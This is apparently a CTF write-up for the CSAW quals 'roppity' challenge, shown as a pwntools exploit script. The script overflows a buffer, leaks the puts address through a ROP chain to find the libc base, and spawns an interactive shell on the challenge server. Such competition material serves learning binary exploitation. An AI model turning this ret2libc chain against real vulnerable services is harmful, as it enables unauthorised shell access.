## CSAW quals: roppity [pwn]
#### I was not the one who solved this for the team during the competition, but I still tried to solve it on my own anyways. Simple buffer overflow - ret2libc challenge. Exploit script now, full writeup later
```python
#: CSAW quals - roppity [50]

from pwn import *

#: Connect to challenge server
#p = process(['setarch', 'x86_64', '-R', './rop'])
p = remote('pwn.chal.csaw.io', 5016)
binary = ELF('./rop')
libc = ELF('libc-2.27.so')

print(p.recv())

#: ROP gadgets
ret = 0x000000000040048e
pop_rdi_ret = 0x0000000000400683

#: Stage1
system = 0x7ffff7a334e0
bin_sh = 0x7ffff7b980fa

exploit = ''
exploit += cyclic(40)
exploit += p64(ret)
exploit += p64(pop_rdi_ret)
exploit += p64(binary.got['puts'])
exploit += p64(binary.symbols['puts'])
exploit += p64(binary.symbols['main'])

p.sendline(exploit)

#: Stage 2
leak = int(hex(u64(p.recv()[:7].ljust(8,'\x00')))[3:], 16)
libc_base = leak - libc.symbols['puts']	
print('LIBC base: {}'.format(hex(libc_base)))
exploit = ''
exploit += cyclic(40)
exploit += p64(pop_rdi_ret)
exploit += p64(libc_base + 0x1b40fa)
exploit += p64(libc_base + 0x04f4e0)
p.sendline(exploit)
p.interactive()
```
